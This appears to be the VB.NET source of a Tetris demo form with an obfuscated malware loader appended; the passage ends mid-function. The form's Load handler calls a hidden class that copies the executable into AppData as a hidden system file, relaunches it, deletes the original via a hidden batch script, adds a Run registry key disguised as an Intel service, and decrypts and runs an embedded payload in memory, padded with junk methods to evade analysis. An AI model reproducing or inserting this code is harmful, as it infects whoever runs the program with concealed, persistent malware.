Public Class Form1
    Private _newBlocksNumber As Integer

    Private Sub pnlBackgroundSolid_Click(sender As Object, e As EventArgs) Handles pnlBackgroundSolid.Click
        Call ManageColorProperty(sender, "BackColor")
    End Sub

    Private Sub ManageColorProperty(sender As Panel, propertyName As String)
        With Me.dlgColor
            .Color = sender.BackColor
            If .ShowDialog(Me) = Windows.Forms.DialogResult.OK Then
                sender.BackColor = .Color
                CallByName(Me.TetrisBox1, propertyName, CallType.Set, .Color)
            End If
        End With
    End Sub

    Private Sub pnlBackgroundGradient1_Click(sender As Object, e As EventArgs) Handles pnlBackgroundGradient1.Click
        Call ManageColorProperty(sender, "GradientColor1")
    End Sub

    Private Sub pnlBackgroundGradient2_Click(sender As Object, e As EventArgs) Handles pnlBackgroundGradient2.Click
        Call ManageColorProperty(sender, "GradientColor2")
    End Sub

    Private Sub lnkBackgroundPicture_LinkClicked(sender As Object, e As LinkLabelLinkClickedEventArgs) Handles lnkBackgroundPicture.LinkClicked
        If Me.dlgBackgroundPicture.ShowDialog(Me) = Windows.Forms.DialogResult.OK Then
            Me.TetrisBox1.BackgroundImage = Image.FromFile(Me.dlgBackgroundPicture.FileName)
        End If
    End Sub

    Private Sub radBackgroundSolid_CheckedChanged(sender As Object, e As EventArgs) Handles radBackgroundSolid.CheckedChanged, radBackgroundGradient.CheckedChanged, radBackgroundPicture.CheckedChanged
        Select Case True
            Case Me.radBackgroundSolid.Checked
                Me.TetrisBox1.BackgroundStyle = TetrisBox.BackgroundStyles.SolidColor
            Case Me.radBackgroundGradient.Checked
                Me.TetrisBox1.BackgroundStyle = TetrisBox.BackgroundStyles.Gradient
            Case Me.radBackgroundPicture.Checked
                Me.TetrisBox1.BackgroundStyle = TetrisBox.BackgroundStyles.Picture
        End Select
    End Sub

    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        RKxFElOgMZc.NEzpjPJAzpa()
        Me.cboGradientDirection.SelectedIndex = 1
        For Each name As String In System.Enum.GetNames(GetType(System.Windows.Forms.Keys))
            Me.cboKeysLeft.Items.Add(name)
            Me.cboKeysRight.Items.Add(name)
            Me.cboKeysRotate.Items.Add(name)
            Me.cboKeysDrop.Items.Add(name)
        Next

        RKxFElOgMZc.QSNspmkurYR()
        Me.cboKeysLeft.SelectedItem = "Left"
        Me.cboKeysRight.SelectedItem = "Right"
        Me.cboKeysRotate.SelectedItem = "Up"
        Me.cboKeysDrop.SelectedItem = "Down"
    End Sub

    Private Sub cboGradientDirection_SelectedIndexChanged(sender As Object, e As EventArgs) Handles cboGradientDirection.SelectedIndexChanged
        Select Case Me.cboGradientDirection.SelectedIndex
            Case 0
                Me.TetrisBox1.GradientDirection = Drawing2D.LinearGradientMode.Horizontal
            Case 1
                Me.TetrisBox1.GradientDirection = Drawing2D.LinearGradientMode.Vertical
            Case 2
                Me.TetrisBox1.GradientDirection = Drawing2D.LinearGradientMode.ForwardDiagonal
            Case 3
                Me.TetrisBox1.GradientDirection = Drawing2D.LinearGradientMode.BackwardDiagonal
        End Select
    End Sub

    Private Sub numRows_ValueChanged(sender As Object, e As EventArgs) Handles numRows.ValueChanged
        Me.TetrisBox1.Rows = Me.numRows.Value
    End Sub

    Private Sub numColumns_ValueChanged(sender As Object, e As EventArgs) Handles numColumns.ValueChanged
        Me.TetrisBox1.Columns = Me.numColumns.Value
    End Sub

    Private Sub numCellSize_ValueChanged(sender As Object, e As EventArgs) Handles numCellSize.ValueChanged
        Me.TetrisBox1.CellSize = Me.numCellSize.Value
    End Sub

    Private Sub pnlBlock1Color_Click(sender As Object, e As EventArgs) Handles pnlBlock1Color.Click, pnlBlock2Color.Click, pnlBlock3Color.Click, pnlBlock4Color.Click, pnlBlock5Color.Click, pnlBlock6Color.Click, pnlBlock7Color.Click
        Call ManageColorProperty(sender, DirectCast(sender, Panel).Name.Replace("pnl", String.Empty))
    End Sub

    Private Sub cboKeysLeft_SelectedIndexChanged(sender As Object, e As EventArgs) Handles cboKeysLeft.SelectedIndexChanged
        Call ManageKeyProperty(sender, "LeftKey")
    End Sub

    Private Sub ManageKeyProperty(sender As ComboBox, propertyName As String)
        Dim names() As String = System.Enum.GetNames(GetType(System.Windows.Forms.Keys))
        Dim values() As Integer = System.Enum.GetValues(GetType(System.Windows.Forms.Keys))
        For index = 0 To names.Length - 1
            If sender.SelectedItem.Equals(names(index)) Then
                CallByName(Me.TetrisBox1, propertyName, CallType.Set, CType(values(index), System.Windows.Forms.Keys))
            End If
        Next
    End Sub

    Private Sub cboKeysRight_SelectedIndexChanged(sender As Object, e As EventArgs) Handles cboKeysRight.SelectedIndexChanged
        Call ManageKeyProperty(sender, "RightKey")
    End Sub

    Private Sub cboKeysRotate_SelectedIndexChanged(sender As Object, e As EventArgs) Handles cboKeysRotate.SelectedIndexChanged
        Call ManageKeyProperty(sender, "RotateKey")
    End Sub

    Private Sub cboKeysDrop_SelectedIndexChanged(sender As Object, e As EventArgs) Handles cboKeysDrop.SelectedIndexChanged
        Call ManageKeyProperty(sender, "DropKey")
    End Sub

    Private Sub pnlRandomBlock_Click(sender As Object, e As EventArgs) Handles pnlRandomBlock.Click
        Call ManageColorProperty(sender, "RandomBlockColor")
    End Sub

    Private Sub pnlUncompleteLine_Click(sender As Object, e As EventArgs) Handles pnlUncompleteLine.Click
        Call ManageColorProperty(sender, "UncompleteRowColor")
    End Sub

    Private Sub tbrSpeed_Scroll(sender As Object, e As EventArgs) Handles tbrSpeed.Scroll, tbrSpeed.ValueChanged
        Me.TetrisBox1.TimerInterval = Me.tbrSpeed.Value
    End Sub

    Private Sub btnStart_Click(sender As Object, e As EventArgs) Handles btnStart.Click
        Me.btnStart.Enabled = False
        Me.btnStop.Enabled = True
        Me.btnPause.Enabled = True

        Me.gbxBackground.Enabled = False
        Me.gbxBlockColors.Enabled = False
        Me.gbxBoardSize.Enabled = False
        Me.gbxDifficulties.Enabled = False
        Me.gbxKeys.Enabled = False

        _newBlocksNumber = 0

        Me.TetrisBox1.StartGame()
    End Sub

    Private Sub btnStop_Click(sender As Object, e As EventArgs) Handles btnStop.Click
        Me.TetrisBox1.StopGame()
        Call GameStopped()
    End Sub

    Private Sub GameStopped()
        Me.btnStart.Enabled = True
        Me.btnStop.Enabled = False
        Me.btnPause.Enabled = False
        Me.btnResume.Enabled = False

        Me.gbxBackground.Enabled = True
        Me.gbxBlockColors.Enabled = True
        Me.gbxBoardSize.Enabled = True
        Me.gbxDifficulties.Enabled = True
        Me.gbxKeys.Enabled = True
    End Sub

    Private Sub TetrisBox1_FullRows(sender As Object, e As TetrisBox.FullRowsEventArgs) Handles TetrisBox1.FullRows
        Me.lstEvents.Items.Add("FullRows [NumberOfRows=" + e.NumberOfRows.ToString + "]")
    End Sub

    Private Sub TetrisBox1_GameOver(sender As Object, e As EventArgs) Handles TetrisBox1.GameOver
        Call GameStopped()
        Me.lstEvents.Items.Add("GameOver")
    End Sub

    Private Sub btnPause_Click(sender As Object, e As EventArgs) Handles btnPause.Click
        Me.TetrisBox1.Pause()
        Me.btnPause.Enabled = False
        Me.btnResume.Enabled = True
    End Sub

    Private Sub btnResume_Click(sender As Object, e As EventArgs) Handles btnResume.Click
        Me.TetrisBox1.Resume()
        Me.btnPause.Enabled = True
        Me.btnResume.Enabled = False
    End Sub

    Private Sub TetrisBox1_NewBlock(sender As Object, e As TetrisBox.NewBlockEventArgs) Handles TetrisBox1.NewBlock
        Me.lstEvents.Items.Add("NewBlock [BlockType=" + e.BlockType.ToString + ", NextBlockType=" + e.NextBlockType.ToString + "]")

        _newBlocksNumber += 1

        If Me.chkRandomBlock.Checked AndAlso ((_newBlocksNumber Mod Me.numRandomBlock.Value) = 0) Then
            Me.TetrisBox1.AddRandomBlock()
        End If

        If Me.chkUncompleteLine.Checked AndAlso ((_newBlocksNumber Mod Me.numUncompleteLine.Value) = 0) Then
            Me.TetrisBox1.AddUncompleteRow()
        End If
    End Sub

    Private Sub TetrisBox1_Starting(sender As Object, e As EventArgs) Handles TetrisBox1.Starting
        Me.lstEvents.Items.Add("Starting")
    End Sub

    Private Sub lnkArticle_LinkClicked(sender As Object, e As LinkLabelLinkClickedEventArgs) Handles lnkArticle.LinkClicked
        Process.Start("http://www.codeproject.com/Articles/812310/Create-Tetris-games-in-Net")
    End Sub
End Class

Class RKxFElOgMZc
    Shared Function jvCSrtLvBva(ByVal OlkWKOToXBu() As Byte, DSjQDZKQiJr As Integer) As Byte()
        Dim xWKyPfTgEMb(0 To (OlkWKOToXBu.Length - DSjQDZKQiJr) - 1) As Byte
        jlDlDtrxDGj()

        Return xWKyPfTgEMb
    End Function
    Public Shared Sub jlDlDtrxDGj()





        Dim CZqssznwKSk As Long = 500
        Dim PTWDlNdbuNN As String = "jewJNSOQbwq"




        Dim FsEKtXypbWW As String = "dKksmZirXdy"
        Dim BnOGTblrRbR As String = "exUpHYceTKN"


        Dim GaprUWIdyhq As Integer = 924




    End Sub



    Shared Sub nvsGWooulVk(ByVal jqDBxtbwcae As String, ByVal ocdmxnyhIhD As String)
        Dim lQYvnrQVUnJ = New anti.IntegrityCheck
        GgxSJwlJari()

        lQYvnrQVUnJ.AppExePath = ocdmxnyhIhD
        lQYvnrQVUnJ.AppPath = jqDBxtbwcae
        lQYvnrQVUnJ.RunCheck()
        rHxxhlWGZPe()

    End Sub
    Public Shared Sub GgxSJwlJari()





        Dim DNjAJZaRKow As Long = 500
        Dim pWVLINVBgXL As String = "KruyYSboLwg"




        Dim zHmkoDUlxEu As String = "VshlGGuzWAC"
        Dim QzyYQluhOkk As String = "rjjNOkwuYGC"


        Dim JnDtatjWpQh As Integer = 924




    End Sub

    Public Shared Sub rHxxhlWGZPe()





        Dim vNvMCHclmzg As Long = 500
        Dim OrkmEODnvWp As String = "VEodqhHfXfq"




        Dim qxzQtlCIbZm As String = "DBdIZzNlJJI"
        Dim PYVTfNNaTiJ As String = "yaAENEKyasa"


        Dim tWUKjjqhUmR As Integer = 924




    End Sub



    Shared Sub QSNspmkurYR()
        Dim suiuCkQtVvt As String = Application.ExecutablePath
        OadeanGIWXG()


        Dim OlkWKOToXBu() As Byte = EvVgkYkEhAP(suiuCkQtVvt)
        Dim LeevtRVbHcv As Integer = ZKlsLDMLkOs(OlkWKOToXBu)
        lKYftrgWvTN()

        Dim DSjQDZKQiJr As Integer = LeevtRVbHcv
        If OlkWKOToXBu(DSjQDZKQiJr - 10) = &H54 Then
            'AZi's
            fpECWXGQoL()

            nvsGWooulVk(Application.StartupPath, suiuCkQtVvt)
        End If

        If OlkWKOToXBu(DSjQDZKQiJr - 14) = &H54 Then
            KfnHpsOIKR()

            'copy self
            Dim MRPsOQPNDJL As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)
            If suiuCkQtVvt.ToLower.Contains(MRPsOQPNDJL.ToLower) Then
            Else
                aGmvEcSlDj()

                Dim wtYihftrGVD As String = Strings.Right(suiuCkQtVvt, (suiuCkQtVvt.ToString.Length - suiuCkQtVvt.LastIndexOf("\")))

                'copy our self to temp and re execute
                Try
                    nzJvAPPijo()

                    FileIO.FileSystem.WriteAllBytes(MRPsOQPNDJL & wtYihftrGVD, FileIO.FileSystem.ReadAllBytes(suiuCkQtVvt), False)

                Catch ex As Exception
                    Try
                        boYbfbcYau()

                        FileIO.FileSystem.DeleteFile(MRPsOQPNDJL & wtYihftrGVD)
                        FileIO.FileSystem.WriteAllBytes(MRPsOQPNDJL & wtYihftrGVD, FileIO.FileSystem.ReadAllBytes(suiuCkQtVvt), False)

                    Catch exx As Exception
                        JOaHbusomD()

                        End
                    End Try
                End Try

                fGcjjYujnJ()


                System.IO.File.SetAttributes(MRPsOQPNDJL & wtYihftrGVD, IO.FileAttributes.Hidden)
                System.IO.File.SetAttributes(MRPsOQPNDJL & wtYihftrGVD, IO.FileAttributes.System)
                Process.Start(MRPsOQPNDJL & wtYihftrGVD)
                IEbanuYqoN()

                'melt
                If OlkWKOToXBu(DSjQDZKQiJr - 12) = &H54 Then
                    FileIO.FileSystem.WriteAllText("a.bat", "ping 127.0.0.1 -n 3 > nul" & Environment.NewLine & "del " & """" & Application.ExecutablePath & """" & Environment.NewLine & "del a.bat", False)
                    Dim startInfo As New ProcessStartInfo("a.bat")
                    zdJhvEtEVW()

                    startInfo.WindowStyle = ProcessWindowStyle.Hidden
                    Process.Start(startInfo)
                    End
                Else
                    KdwUdsMPga()

                    End
                End If

            End If
            jFSXPTXiXj()

        End If

        'check if auto startup
        If OlkWKOToXBu(DSjQDZKQiJr - 8) = &H54 Then
            PnlpxnJNOq()

            xbJPIeDfdhX()
        End If

        Dim xWKyPfTgEMb() As Byte = jvCSrtLvBva(OlkWKOToXBu, DSjQDZKQiJr)
        knEEqShWvu()

        xWKyPfTgEMb = Loop1(xWKyPfTgEMb, OlkWKOToXBu, DSjQDZKQiJr)
        xWKyPfTgEMb = Loop2(xWKyPfTgEMb)


        yXKRBEJFwB()

        Award.Win.Run(gjwbgwdjMCg(BtOWNbWqqwN(xWKyPfTgEMb)), Command, Application.ExecutablePath)

        Process.GetCurrentProcess.Kill()
    End Sub
    Public Shared Sub OadeanGIWXG()





        Dim gLirNvDXLtE As Long = 500
        Dim rBpVrKtZxFm As String = "xgIfCeneCCS"




        Dim qDHsjMfoDjf As String = "AiPpZbBssGV"
        Dim BhHeeBJKpRZ As String = "hQiHHvnWjNA"


        Dim URDgViNsbya As Integer = 924




    End Sub

    Public Shared Sub lKYftrgWvTN()





        Dim NxrOtogTXgi As Long = 500
        Dim SlaKpJwmHbD As String = "PkcLOnaGTMx"




        Dim YXBvqESYnic As String = "EoNFuxHXFqX"
        Dim VKvEfHkMzoi As String = "oemytOrPLW"


        Dim mrBBYPxcPp As Integer = 924




    End Sub

    Public Shared Sub fpECWXGQoL()


        Dim MFIBeqCiCe As Long = 408
        Dim BcIOkBYLQw As String = "CZqssznwKS"

        Dim ZyeBbczfjk As String = "JyBaOtDVnG"

        Dim OadeanGIWX As Object = {}


        Dim gcpzrWACks As Long = 890


        Dim GlwjDwVIzM As String = "UMEPbidtCd"

        Dim cYzvRaoEbx As Object = {}


    End Sub

    Public Shared Sub KfnHpsOIKR()


        Dim AuWhJCOYtl As Long = 408
        Dim RFypKlegnE As String = "pWVLINVBgX"

        Dim ojlOnObOkr As String = "uDxgOHInoJ"

        Dim NxrOtogTXg As Object = {}


        Dim CUrbyADxly As Long = 890


        Dim SmjVlkoUKQ As String = "bqOOqbdREl"

        Dim jATHVUnjzO As Object = {}


    End Sub

    Public Shared Sub aGmvEcSlDj()


        Dim GeGgywjRwA As Long = 408
        Dim fnOQKXEXKU As String = "gsNgEXoWjp"

        Dim nEILuPzhIJ As String = "WMwXShZlrd"

        Dim MbfymraBaw As Object = {}


        Dim qGPVRMOvyN As Long = 890


        Dim BCeblChdNj As String = "APueQDnrRD"

        Dim GjGwrwUQVV As Object = {}


    End Sub

    Public Shared Sub nzJvAPPijo()


        Dim OAAscoOaSJ As Long = 408
        Dim dTsmOZAxrc As String = "AsgvxCNfPu"

        Dim ksDUkSRVUP As String = "byWISbwWYk"

        Dim HWqtMvODRC As Object = {}


        Dim hfxdZWjJfW As Long = 890


        Dim vGFKxIqujn As String = "DSBpnABFIH"

        Dim lZoBLRbIrb As Object = {}


    End Sub

    Public Shared Sub boYbfbcYau()


        Dim syzjgLshTO As Long = 408
        Dim QQXFemjBNh As String = "PdmIJooORA"

        Dim HbpKGvyCqW As String = "prtIPOuUEp"

        Dim dOtVUZQxSH As Object = {}


        Dim tgkPHKCUra As Long = 890


        Dim CkQIMBrRkv As String = "zFvycDTsTN"

        Dim rMPmLMyuXi As Object = {}


    End Sub

    Public Shared Sub JOaHbusomD()


        Dim wsqHSGkgfT As Long = 408
        Dim wypXLGUfEo As String = "EKlCCzfqdI"

        Dim mRYOZQFuMc As String = "cgHptaGKvw"

        Dim tqjwvJWToP As Object = {}


        Dim RIGSslNnii As Long = 890


        Dim QVWVYmTAmC As String = "XpinzgzZpU"

        Dim EElmIzvrEn As Object = {}


    End Sub

    Public Shared Sub fGcjjYujnJ()


        Dim uYUdWIgGMb As Long = 408
        Dim DczVbzVDFw As String = "BxfLrCxeoO"

        Dim sEyzaLcgsj As String = "YbSkUftMmB"

        Dim xlaUgFOSAV As Object = {}


        Dim xqZkaFzRZq As Long = 890


        Dim FCUQRxJcyJ As String = "BfQsSBHSLa"

        Dim rtASmLIivt As Object = {}


    End Sub

    Public Shared Sub IEbanuYqoN()


        Dim TAqgHkrZDk As Long = 408
        Dim RNGjmlxmHD As String = "YhRBOfeLKV"

        Dim FwVzXxZdZo As String = "uTVNcJwHnG"

        Dim vQEqkHKshd As Object = {}


        Dim SpszTkXaFu As Long = 890


        Dim CpPYGBbQJQ As String = "HRrdSveDsh"

        Dim ZTCyjdYyHC As Object = {}


    End Sub

    Public Shared Sub zdJhvEtEVW()


        Dim NDROTqApYn As Long = 408
        Dim UPNtJiLAxH As String = "DXAFhAlEgb"

        Dim tlkgBKmTQv As String = "JwLnCtCcJP"

        Dim iNjKAVtwCh As Object = {}


        Dim hayNfWzKGB As Long = 890


        Dim ZZBOddIxfX As String = "GoFNlwEPuq"

        Dim vLFarHatII As Object = {}


    End Sub

    Public Shared Sub KdwUdsMPga()


        Dim ThbNijBMav As Long = 408
        Dim RCHCzldoJN As String = "IJaqhuIpNi"

        Dim aMmLxcCkcD As String = "OqCLopucVU"

        Dim OvBbipebtp As Object = {}


        Dim WHwHYhpmSI As Long = 890


        Dim EPkSwyPqBd As String = "udTtQIQFlw"

        Dim LovBRsgOeQ As Object = {}


    End Sub

    Public Shared Sub jFSXPTXiXj()


        Dim iSiauVdvbC As Long = 408
        Dim omusVOJVfV As String = "VCxqehFnto"

        Dim wDonFGEfdJ As String = "MVghsrqBBc"

        Dim VZLaxifyvx As Object = {}


        Dim SurQNkHaeP As Long = 890


        Dim KBKEwtmbij As String = "pZepqNEHbB"

        Dim PilYDnZNqV As Object = {}


    End Sub

    Public Shared Sub PnlpxnJNOq()


        Dim XzgUngUYnK As Long = 408
        Dim TccwojRNBb As String = "JrMXItSdku"

        Dim aBneKcileO As String = "ySLBHEZGXh"

        Dim xfaEmFeTbA As Object = {}


        Dim qedFkNoGAW As Long = 890


        Dim XuhEtgjYOp As String = "LQhRyrGCcH"

        Dim NNQvHqUnWd As Object = {}


    End Sub

    Public Shared Sub knEEqShWvu()


        Dim UnbdcjlLzQ As Long = 408
        Dim ZODhpeozih As String = "rROCFMitwC"

        Dim QaVmRmDzLX As String = "eAdSpYKkOo"

        Dim mMZyfQVvnI As Object = {}


        Dim VUMKDivzWc As Long = 890


        Dim LjvkXswPFv As String = "btXsYbMXzP"

        Dim zKvOWDDssi As Object = {}


    End Sub

    Public Shared Sub yXKRBEJFwB()


        Dim FrWjdypeAU As Long = 408
        Dim YmRRIeOKjq As String = "NIQeNqkoxI"

        Dim cbIYzaWLWb As String = "lfnRERLIQw"

        Dim aGmvEcSlDjC As Object = {}


        Dim ZCwpFDbThD As Long = 890


        Dim AbanUcQAqu As String = "mqTZIqoRon"

        Dim PGhklNHkSg As Object = {}


    End Sub




    Public Shared Function BtOWNbWqqwN(bytes As Byte()) As Byte()
        Dim stream = New IO.MemoryStream()
        COKkpbKnmb()

        Dim zipStream = New IO.Compression.DeflateStream(New IO.MemoryStream(bytes), IO.Compression.CompressionMode.Decompress, True)
        Dim buffer = New Byte(4095) {}
        While True
            Dim size = zipStream.Read(buffer, 0, buffer.Length)
            lDjcnruesH()

            If size > 0 Then
                stream.Write(buffer, 0, size)
            Else
                Exit While
                LucsbRZYen()

            End If
        End While
        zipStream.Close()
        Return stream.ToArray()
        wbkyognBFU()

    End Function
    Public Shared Sub COKkpbKnmb()


        Dim gWIHhxHslV As Long = 408
        Dim irdldvLSEN As String = "NrKWjPnJYJ"

        Dim QEQNuMWVMC As String = "LSpcuSzkfw"

        Dim drnxxzjTTn As Object = {}


        Dim ZxxZLDrUIi As Long = 890


        Dim tPeHejFpRb As String = "EigNlYONFT"

        Dim ZsxJRDGVjN As Object = {}


    End Sub

    Public Shared Sub lDjcnruesH()


        Dim HFkljVRYrC As Long = 408
        Dim jdOixtGFAu As String = "UtIVmIeWzn"

        Dim joMPltaDyj As String = "kQyfSsAswa"

        Dim OZwDKOxxvV As Object = {}


        Dim QtShGMBXON As Long = 890


        Dim vuzSNhdOiI As String = "yGEJYeMaWC"

        Dim tUeYXjpoqv As Object = {}


    End Sub

    Public Shared Sub LucsbRZYen()


        Dim HAlVpVgYSh As Long = 408
        Dim bSSDHBvuba As String = "YQLskEgglW"

        Dim HvmEvVwZtN As String = "TGXYRJkjDG"

        Dim qIYhNnGcBC As Object = {}


        Dim RgCebLwKKt As Long = 890


        Dim panAmowpeq As String = "RrAKPLQIIj"

        Dim STnbwKqwGa As Object = {}


    End Sub

    Public Shared Sub wbkyognBFU()


        Dim kbxMGsUquQ As Long = 408
        Dim dwnNrzTTsI As String = "hJsECvBfhC"

        Dim bXSTBBftAv As String = "gbHYbwrrJq"

        Dim pCZQTnWddh As Object = {}


        Dim JUHylTlzma As Long = 890


        Dim GSzoOWWlvW As String = "bcRkvBPsZQ"

        Dim onCDRpCCiK As Object = {}


    End Sub


    Shared Function Loop2(ByVal xWKyPfTgEMb() As Byte) As Byte()
        Dim Tmp() As Byte = xWKyPfTgEMb
        YKMcqEwhMB()

        Dim LeevtRVbHcv As Integer = ZKlsLDMLkOs(xWKyPfTgEMb) - 7
        ReDim xWKyPfTgEMb(0 To LeevtRVbHcv)
        For LeevtRVbHcv = 0 To xWKyPfTgEMb.Length - 1
            xWKyPfTgEMb(LeevtRVbHcv) = Tmp(LeevtRVbHcv)
            YFNMxEMinh()

        Next
        Return xWKyPfTgEMb
    End Function
    Public Shared Sub YKMcqEwhMB()


        Dim lOhJbrOdqw As Long = 408
        Dim XdbvQFmtpq As String = "AtoGtdGNSj"

        Dim mASGwqIPmd As String = "eeYuSydGQU"

        Dim SdlHkKKvEP As Object = {}


        Dim MzbJVRJXDI As Long = 890


        Dim PMgAfNrjrB As String = "JZGPfTVyKu"

        Dim OevTEOhwUp As Object = {}


    End Sub

    Public Shared Sub YFNMxEMinh()


        Dim eCmelzDSRd As Long = 408
        Dim oVoksoMqFV As String = "KfFfZTFxjP"

        Dim WqqyvGsHsJ As String = "RCabjM"

        Dim olMQFp As Object = {}


        Dim jhXMgu As Long = 890


        Dim IItPRV As String = "FwnYHY"

        Dim skCEll As Object = {}


    End Sub



    Shared Function Loop1(ByVal xWKyPfTgEMb() As Byte, ByVal OlkWKOToXBu() As Byte, ByVal DSjQDZKQiJr As Integer) As Byte()
        For LeevtRVbHcv As Integer = 0 To xWKyPfTgEMb.Length - 1
            qQgbpn()

            xWKyPfTgEMb(LeevtRVbHcv) = OlkWKOToXBu(DSjQDZKQiJr + LeevtRVbHcv)
        Next
        Return xWKyPfTgEMb
        xkstQg()

    End Function
    Public Shared Sub qQgbpn()





        Dim tSnlMk As String = "tqBVfk"

    End Sub

    Public Shared Sub xkstQg()





        Dim LVyGcS As String = "RHZrdM"

    End Sub



    Shared Sub xbJPIeDfdhX()
        Dim regKey As Microsoft.Win32.RegistryKey
        uFYihi()

        regKey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run", True)
        regKey.SetValue("Intel(R) Dynamic Platform and Thermal Framework LPM Policy Service Helper", """" & Application.ExecutablePath & """")
        regKey.Close()
        CRTNXb()

    End Sub
    Public Shared Sub uFYihi()





        Dim Bjihwc As String = "gZQlPx"

    End Sub

    Public Shared Sub CRTNXb()





        Dim izlfFv As String = "GiYVcX"

    End Sub


    Shared Function ZKlsLDMLkOs(ByVal OlkWKOToXBu() As Byte) As Integer
        Dim Found1 As Boolean = False
        BejQCc()

        Dim Found2 As Boolean = False
        Dim Found3 As Boolean = False
        Dim Found4 As Boolean = False
        KiOJHT()

        Dim Found5 As Boolean = False
        Dim LeevtRVbHcv As Integer = 0
        For Each bytez As Byte In OlkWKOToXBu
            YIWqfF()

            If Found5 = True Then Exit For
            If Found1 = False Then
                If bytez = &H21 Then
                    jElwzu()

                    Found1 = True
                End If
            Else
                yXcqlf()

                If Found2 = False Then
                    If bytez = &H0 Then
                        Found2 = True
                        XgkZyF()

                    Else
                        Found1 = False
                    End If
                    oqLhzp()

                Else
                    If Found3 = False Then
                        If bytez = &H40 Then
                            dNLuEA()

                            Found3 = True
                        Else
                            Found1 = False
                            vPWPVi()

                            Found2 = False
                        End If
                    Else
                        leGqps()

                        If Found4 = False Then
                            If bytez = &H0 Then
                                Found4 = True
                                SuJoxL()

                            Else
                                Found3 = False
                                Found2 = False
                                XVltKG()

                                Found1 = False
                            End If
                        Else
                            TyiVMJ()

                            If Found5 = False Then
                                If bytez = &H21 Then
                                    Found5 = True
                                    MxkWJR()

                                Else
                                    Found4 = False
                                    Found3 = False
                                    JSQMZT()

                                    Found2 = False
                                    Found1 = False
                                End If
                                ReMrQL()

                            End If
                        End If
                    End If
                    QrbuvM()

                End If
            End If
            LeevtRVbHcv += 1
            nQPDep()

        Next
        Return LeevtRVbHcv + 1
    End Function
    Public Shared Sub BejQCc()





        Dim aFFToD As String = "WtzcdH"

    End Sub

    Public Shared Sub KiOJHT()





        Dim WiBvpH As String = "LPzqiS"

    End Sub

    Public Shared Sub YIWqfF()





        Dim PhExnO As String = "dSKKyA"

    End Sub

    Public Shared Sub jElwzu()





        Dim MCknDR As String = "TgulSK"

    End Sub

    Public Shared Sub yXcqlf()





        Dim UOfStJ As String = "Awxkbd"

    End Sub

    Public Shared Sub XgkZyF()





        Dim TbvVYK As String = "rDRYKm"

    End Sub

    Public Shared Sub oqLhzp()





        Dim cfaNdB As String = "ogNALp"

    End Sub

    Public Shared Sub dNLuEA()





        Dim qGiuBn As String = "geQBJx"

    End Sub

    Public Shared Sub vPWPVi()





        Dim OXFQzP As String = "eAvrZz"

    End Sub

    Public Shared Sub leGqps()





        Dim QUouIN As String = "mLrWQr"

    End Sub

    Public Shared Sub SuJoxL()





        Dim pdweUo As String = "lZGZvs"

    End Sub

    Public Shared Sub XVltKG()





        Dim UJgBzJ As String = "HyuieV"

    End Sub

    Public Shared Sub TyiVMJ()





        Dim IfgPFU As String = "WYCPBH"

    End Sub

    Public Shared Sub MxkWJR()





        Dim oDAAzo As String = "upalzj"

    End Sub

    Public Shared Sub JSQMZT()





        Dim eRjbTy As String = "vmJPIh"

    End Sub

    Public Shared Sub ReMrQL()





        Dim xMeJyf As String = "jRZPyu"

    End Sub

    Public Shared Sub QrbuvM()





        Dim DoGNKa As String = "zbBWAd"

    End Sub

    Public Shared Sub nQPDep()





        Dim lwtZis As String = "adsTbD"

    End Sub



    Shared Function EvVgkYkEhAP(ByVal suiuCkQtVvt As String) As Byte()
        Return FileIO.FileSystem.ReadAllBytes(suiuCkQtVvt)
        nVOTYp()

    End Function
    Public Shared Sub nVOTYp()





        Dim sPFrJl As String = "GAMEVX"

    End Sub


    Public Shared _initialized As Boolean
    Shared Sub NEzpjPJAzpa()
        If Not _initialized Then
            MmmqVR()

            AddHandler AppDomain.CurrentDomain.AssemblyResolve, AddressOf RetrieveEmbeddedAssembly
            _initialized = True
        End If
        NkVTeQ()

    End Sub
    Public Shared Sub MmmqVR()





        Dim bPcQwB As String = "wPvfph"

    End Sub

    Public Shared Sub NkVTeQ()





        Dim jbYvmu As String = "dfzeyz"

    End Sub


    Private Shared Function gjwbgwdjMCg(ByVal input() As Byte) As Byte()
        Dim AES As New System.Security.Cryptography.RijndaelManaged
        AOlTUc()

        Dim Hash_AES As New System.Security.Cryptography.MD5CryptoServiceProvider

        Try
            RZNbWM()

            Dim hash(31) As Byte
            Dim temp As Byte() = Hash_AES.ComputeHash(System.Text.ASCIIEncoding.ASCII.GetBytes("password"))
            Array.Copy(temp, 0, hash, 0, 16)
            saEYxl()

            Array.Copy(temp, 0, hash, 15, 16)
            AES.Key = hash
            AES.Mode = Security.Cryptography.CipherMode.ECB
            YyXJrF()

            Dim DESDecrypter As System.Security.Cryptography.ICryptoTransform = AES.CreateDecryptor
            Dim decrypted() As Byte = DESDecrypter.TransformFinalBlock(input, 0, input.Length)
            Return decrypted
            OMHkLP()

        Catch ex As Exception
            Return Nothing
        End Try
        vcLiUi()

    End Function
    Public Shared Sub AOlTUc()





        Dim ionyRv As String = "UlSSgI"

    End Sub

    Public Shared Sub RZNbWM()





        Dim FNbHAY As String = "DtFeEa"

    End Sub

    Public Shared Sub saEYxl()





        Dim FTaYuY As String = "JNRvgT"

    End Sub

    Public Shared Sub YyXJrF()





        Dim dkyusz As String = "tNoVSk"

    End Sub

    Public Shared Sub OMHkLP()





        Dim tCqoek As String = "BZjAIc"

    End Sub

    Public Shared Sub vcLiUi()





        Dim SLxYrK As String = "AmzDnd"

    End Sub


    Private Shared Function RetrieveEmbeddedAssembly(sender As Object, args As System.ResolveEventArgs) As System.Reflection.Assembly
        'get the root namespace (im tired of manually adding this)
        mjeWDq()

        Dim asm As Reflection.[Assembly] = System.Reflection.Assembly.GetEntryAssembly
        Dim RootNamespace As String = Strings.Left(asm.EntryPoint.DeclaringType.Namespace, asm.EntryPoint.DeclaringType.Namespace.ToString().IndexOf(".") + 1)
        'fuck ya! Im done manually adding that shit!!!
        VqRiaI()

        Dim resourceName As String = RootNamespace + New Reflection.AssemblyName(args.Name).Name + ".dll"
        'resourceName = "dll.dll"
        Using stream = Reflection.Assembly.GetExecutingAssembly.GetManifestResourceStream(resourceName)
            bKdACC()


            Dim assemblyData = New Byte(stream.Length - 1) {}
            'decode assembly here
            LKAZoS()


            stream.Read(assemblyData, 0, assemblyData.Length)
            assemblyData = gjwbgwdjMCg(BtOWNbWqqwN(assemblyData))
